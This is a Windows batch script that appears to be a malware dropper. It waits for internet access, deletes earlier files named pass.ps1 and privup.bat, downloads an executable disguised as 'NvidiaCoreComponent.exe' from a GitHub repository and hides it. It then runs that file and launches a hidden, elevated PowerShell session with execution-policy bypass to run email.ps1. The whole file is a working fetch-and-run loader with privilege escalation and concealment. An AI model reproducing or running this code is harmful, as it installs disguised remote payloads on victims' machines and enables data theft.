@echo off
:ping
ping www.google.com -n 2 | find "TTL="
IF %ERRORLEVEL% EQU 0 ( goto run ) else ( goto ping )

:run
if exist %appdata%\Microsoft\pass.ps1 (del /f %appdata%\Microsoft\pass.ps1)
if exist %appdata%\Microsoft\privup.bat (del /f %appdata%\Microsoft\privup.bat)
if exist %appdata%\Microsoft\NvidiaCoreComponent.exe (
	QPROCESS "NvidiaCoreComponent.exe">NUL
	IF %ERRORLEVEL% EQU 0 (exit) else (goto execute)
	) else (goto download && goto execute)

:download
powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/NvidiaCoreComponent.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
attrib +h %appdata%\Microsoft\NvidiaCoreComponent.exe

:execute
NvidiaCoreComponent.exe
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\email.ps1' -WindowStyle Hidden -Verb RunAs -Wait"
exit
